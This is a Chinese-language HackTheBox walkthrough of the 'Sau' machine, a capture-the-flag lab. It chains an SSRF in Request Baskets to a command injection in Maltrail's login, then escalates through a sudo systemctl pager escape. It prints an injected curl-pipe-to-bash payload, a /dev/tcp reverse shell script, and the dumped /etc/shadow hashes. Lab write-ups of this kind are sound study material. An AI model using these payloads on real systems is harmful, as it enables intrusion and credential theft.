---
title: Sau - HackTheBox
url: https://darkwing.moe/2023/07/10/Sau-HackTheBox/
source: 喵喵喵喵
date: 2023-07-11
fetch_date: 2025-10-04T11:51:41.633867
---

# Sau - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Sau - HackTheBox

# Sau - HackTheBox

##### 2023-07-10

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 55555](#55555)
3. [3. Request Baskets](#Request-Baskets)
   1. [3.1. SSRF](#SSRF)
4. [4. Maltrail](#Maltrail)
   1. [4.1. shell.sh](#shell-sh)
5. [5. user flag](#user-flag)
6. [6. 提权信息](#提权信息)
7. [7. 提权 & root flag](#提权-amp-root-flag)
   1. [7.1. shadow](#shadow)
8. [8. 参考资料](#参考资料)

# Sau - HackTheBox

2023-07-10

# 基本信息

* <https://app.hackthebox.com/machines/Sau>
* 10.10.11.224

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071001.jpg)

# 端口扫描

22和55555开放，80被过滤：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.224 Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-10 13:32 CST Nmap scan report for 10.10.11.224 Host is up (0.10s latency). Not shown: 997 closed tcp ports (conn-refused) PORT      STATE    SERVICE VERSION 22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA) |   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA) |_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519) 80/tcp    filtered http 55555/tcp open     unknown | fingerprint-strings: |   FourOhFourRequest: |     HTTP/1.0 400 Bad Request |     Content-Type: text/plain; charset=utf-8 |     X-Content-Type-Options: nosniff |     Date: Mon, 10 Jul 2023 05:33:32 GMT |     Content-Length: 75 |     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$ |   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: |     HTTP/1.1 400 Bad Request |     Content-Type: text/plain; charset=utf-8 |     Connection: close |     Request |   GetRequest: |     HTTP/1.0 302 Found |     Content-Type: text/html; charset=utf-8 |     Location: /web |     Date: Mon, 10 Jul 2023 05:33:04 GMT |     Content-Length: 27 |     href="/web">Found</a>. |   HTTPOptions: |     HTTP/1.0 200 OK |     Allow: GET, OPTIONS |     Date: Mon, 10 Jul 2023 05:33:04 GMT |_    Content-Length: 0 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port55555-TCP:V=7.94%I=7%D=7/10%Time=64AB9810%P=x86_64-apple-darwin22.4 SF:.0%r(GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/ SF:html;\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Mon,\x2010\x20J SF:ul\x202023\x2005:33:04\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20hre SF:f=\"/web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\. SF:0\x20200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Mon,\x2010\x20J SF:ul\x202023\x2005:33:04\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPR SF:equest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/ SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re SF:quest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\ SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B SF:ad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\ SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos SF:e\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x SF:20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf- SF:8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionRe SF:q,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request SF:")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba SF:d\x20Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Reque SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-O SF:ptions:\x20nosniff\r\nDate:\x20Mon,\x2010\x20Jul\x202023\x2005:33:32\x2 SF:0GMT\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\ SF:x20name\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,2 SF:50}\$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4 SF:00\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20R SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\ SF:x20close\r\n\r\n400\x20Bad\x20Request"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 129.02 seconds ``` |

## 55555

是一个Request Baskets：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071002.jpg)

# Request Baskets

简单测试就是创建baskets，接收请求：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071003.jpg)

## SSRF

Request-baskets 1.2.1版本，可以搜到已知SSRF漏洞：

* request-baskets SSRF details - CodiMD
  <https://notes.sjtu.edu.cn/s/MUUhEymt7>

根据前面nmap结果，直接SSRF 80端口，然后访问创建的路由发现Maltrail v0.53(注意需要把proxy\_response设置为true，这样才会看到响应信息)：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071004.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071005.jpg)

# Maltrail

这个可以搜到命令注入，在login的username参数里：

* Unauthenticated OS Command Injection in stamparm/maltrail vulnerability found in maltrail
  <https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/>

那就是同样的，新建路由，SSRF到login，然后利用命令注入：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071006.jpg)

|  |  |
| --- | --- |
| ``` 1 ``` | ``` curl -X POST 'http://10.10.11.224:55555/miao3' --data 'username=;`curl http://10.10.14.12:7777/shell.sh | bash`' ``` |

打到puma用户：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071007.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071008.jpg)

## shell.sh

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` #!/bin/bash /bin/bash -i >& /dev/tcp/10.10.14.12/4444 0>&1 ``` |

# user flag

puma用户目录：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071009.jpg)

# 提权信息

sudo运行system查看指定服务状态，标准的gtfobin：

* systemctl | GTFOBins
  <https://gtfobins.github.io/gtfobins/systemctl/#sudo>

现在已经有针对这个的CVE了，后续新版本这种方法就不行了：

* CVE - CVE-2023-26604
  <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-26604>

# 提权 & root flag

按照gtfobins里的步骤：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` sudo /usr/bin/systemctl status trail.service  !sh ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071010.jpg)

## shadow

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` root:$6$4IguUssRBYl3/LvG$MfnFD1Y9saTrvw2OqA1VtqKxa7TsDt1kb2qsJw6inQ8GfmnqIrh32eqk9IMO4UR3fYG.TzbJeiFd7UOu1QlGR0:19461:0:99999:7::: puma:$6$eB4LwfQg7IgQC38d$SktdHbU0gQAh0.BoRY36FHreH6xR073oHdRrk6hmvar4eZTnmkfxbUxsMBsaZMRm9XHYQF9hG4l5v6fefYdic/:19461:0:99999:7::: ``` |

# 参考资料

* request-baskets SSRF details - CodiMD
  <https://notes.sjtu.edu.cn/s/MUUhEymt7>
* Unauthenticated OS Command Injection in stamparm/maltrail vulnerability found in maltrail
  <https://huntr.dev/bounties/be3c5204-...